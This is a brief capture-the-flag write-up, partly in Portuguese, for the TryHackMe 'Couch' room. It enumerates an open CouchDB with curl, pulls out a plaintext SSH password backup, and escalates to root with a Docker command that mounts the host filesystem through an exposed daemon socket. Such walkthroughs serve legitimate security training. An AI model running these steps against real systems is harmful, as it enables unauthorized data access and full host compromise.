#ctf
# Couch
https://tryhackme.com/room/couch

## Recon

### NMAP

    PORT     STATE SERVICE
    22/tcp   open  ssh
    5984/tcp open  couchdb 1.6.1

### Enum CouchDB

#### Databases

```sh
curl -X GET http://<IP>:5984/secret/_all_dbs
```
- users
- couch
- secret

Usando o curl para poder puxar os dados:

```sh
curl -X GET http://<IP>:5984/secret/_all_docs
curl -X GET http://<IP>:5984/secret/a1320dd69fb4570d0a3d26df4e000be7
```
- **ID:** a1320dd69fb4570d0a3d26df4e000be7
- **passwordbackup:** atena:t4qfzcc4qN## -> ssh

OBS: Em /_utils é possível acessar a db pela web.

## Privesc

No __history__ tem um comando docker que da acesso ao root

```sh
docker -H tcp://127.0.0.1:2375 run --rm -ti -v /:/mnt alpine chroot /mnt /bin/sh
```
